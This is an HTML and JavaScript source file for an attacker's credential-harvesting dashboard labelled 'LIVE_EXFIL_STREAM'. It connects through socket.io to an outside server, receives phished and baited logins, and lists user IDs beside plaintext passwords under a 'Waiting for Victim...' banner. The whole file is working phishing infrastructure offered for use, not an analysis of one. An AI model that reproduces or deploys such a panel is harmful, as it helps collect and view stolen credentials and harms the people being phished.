<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Aura | Real-Time Exfiltration Database</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background-color: #020617; color: #10b981; font-family: 'Courier New', monospace; }
        .tab-active { border-bottom: 2px solid #10b981; color: white; }
    </style>
</head>
<body class="p-8">
    <div class="max-w-6xl mx-auto">
        <header class="mb-10 flex justify-between items-center border-b border-slate-800 pb-4">
            <h1 class="text-2xl font-bold">LIVE_EXFIL_STREAM v2.0</h1>
            <div id="status" class="text-xs text-red-500 font-bold uppercase tracking-widest">Waiting for Victim...</div>
        </header>

        <div class="flex space-x-4 mb-6">
            <button onclick="currentTab='PHISHING'; render()" id="t-phish" class="tab-active px-4 py-2">PHISHING_LOGS</button>
            <button onclick="currentTab='BAITING'; render()" id="t-bait" class="px-4 py-2 opacity-50">BAITING_LOGS</button>
        </div>

        <div class="bg-slate-900 rounded-xl border border-slate-800 overflow-hidden">
            <table class="w-full text-left">
                <thead>
                    <tr class="bg-slate-950 text-slate-500 text-xs">
                        <th class="p-4">TIME</th>
                        <th class="p-4">USER_ID</th>
                        <th class="p-4">PLAINTEXT_PASS</th>
                        <th class="p-4">TYPE</th>
                    </tr>
                </thead>
                <tbody id="rows"></tbody>
            </table>
        </div>
    </div>

    <script>
const socket = io("https://cybersecurity-2.onrender.com");
        let logs = [];
        let currentTab = 'PHISHING';

        socket.on('new_data', (data) => {
    console.log("New Data Object Received:", data); // Check keys here
    logs.unshift(data); 
    document.getElementById('status').innerText = "!!! NEW DATA RECEIVED !!!";
    document.getElementById('status').className = "text-green-500 font-bold animate-bounce";
    render();
});

function render() {
    const container = document.getElementById('rows');
    
    // Improved Filtering
    const filtered = logs.filter(l => {
        const type = l.type ? l.type.toUpperCase() : "";
        if (currentTab === 'PHISHING') {
            // Include anything related to the phishing flow
            return type.includes('PHISH') || type.includes('GMAIL') || type.includes('LINK');
        }
        return type.includes('BAITING');
    });

    // Update Tab Styles
    document.getElementById('t-phish').className = currentTab === 'PHISHING' ? 'tab-active px-4 py-2' : 'px-4 py-2 opacity-50';
    document.getElementById('t-bait').className = currentTab === 'BAITING' ? 'tab-active px-4 py-2' : 'px-4 py-2 opacity-50';

    container.innerHTML = filtered.map(log => `
        <tr class="border-b border-slate-800 hover:bg-white/5 transition-all">
            <td class="p-4 text-slate-500 text-xs font-mono">${log.time}</td>
            <td class="p-4 text-white font-bold">${log.user}</td>
            <td class="p-4 text-red-500 font-black tracking-widest">${log.pass}</td>
            <td class="p-4 text-indigo-400 text-[10px] uppercase font-bold">${log.type}</td>
        </tr>
    `).join('');
}
    </script>
</body>
</html>